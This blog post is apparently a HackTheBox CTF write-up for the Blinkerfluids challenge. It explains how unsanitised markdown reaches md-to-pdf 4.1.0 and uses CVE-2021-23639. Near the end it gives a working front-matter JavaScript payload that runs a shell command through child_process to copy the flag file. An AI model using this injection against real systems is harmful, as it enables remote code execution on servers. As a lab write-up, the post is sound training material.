---
title:  "HTB CTF - Blinkerfluids writeup"
date:   2022-05-20 08:30:00
tags: ["ctf-writeup"]
author: "Alex Ward"
---

![](https://i.postimg.cc/8P3t2K8M/Pasted-image-20220515091447.png)

A fairly simple solve. The site doesn't have much functionality and
the only input is the ability to use markdown to create an invoice.

<!-- more -->

![](https://i.postimg.cc/pLFqRfx7/Pasted-image-20220515091519.png)

Even though the generated invoice weren't viewable in the app, viewing
the source code showed they were available under `/static/invoices/<uuid>.pdf`.

```
.
├── build-docker.sh
├── challenge
│   ├── database.js
│   ├── helpers
│   │   └── MDHelper.js
│   ├── index.js
│   ├── invoice.db
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   ├── bootstrap.min.css
│   │   │   ├── easymde.min.css
│   │   │   └── main.css
│   │   ├── images
│   │   │   └── favicon.png
│   │   ├── invoices
│   │   │   └── <uuid>.pdf
│   │   └── js
│   │       ├── easymde.min.js
│   │       ├── jquery-3.6.0.min.js
│   │       └── main.js
│   └── views
│       └── index.html
├── config
│   └── supervisord.conf
├── Dockerfile
├── exploit.txt
└── flag.txt
```

The source shows that the markdown content is passed unsanitised to `makePDF`.

```js
router.post('/api/invoice/add', async (req, res) => {
    const { markdown_content } = req.body;

    if (markdown_content) {
        return MDHelper.makePDF(markdown_content)
            .then(id => {
```

`MDHelper.js` requires `md-to-pdf`, and the `package.json` reveals the
version to be `4.1.0`. A quick Google search later takes us to
[CVE-2021-23639](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880),
a vulnerability allowing Javascript to be run in the
[front matter](https://jekyllrb.com/docs/front-matter/) of the markdown.

```js
---js
(1+1;)
---
```

To get the flag I first tried `cat`ing the flag into the pdf, which didn't work.

Next, I spend some time faffing trying to get a reverse shell to work.

Finally, my brain woke up and I realised I could just `cat` the flag to a
readable directory (`./static/invoices/`).

```js
---js
((require("child_process")).execSync("cat /flag > ./static/invoices/flag.txt"))
---
```

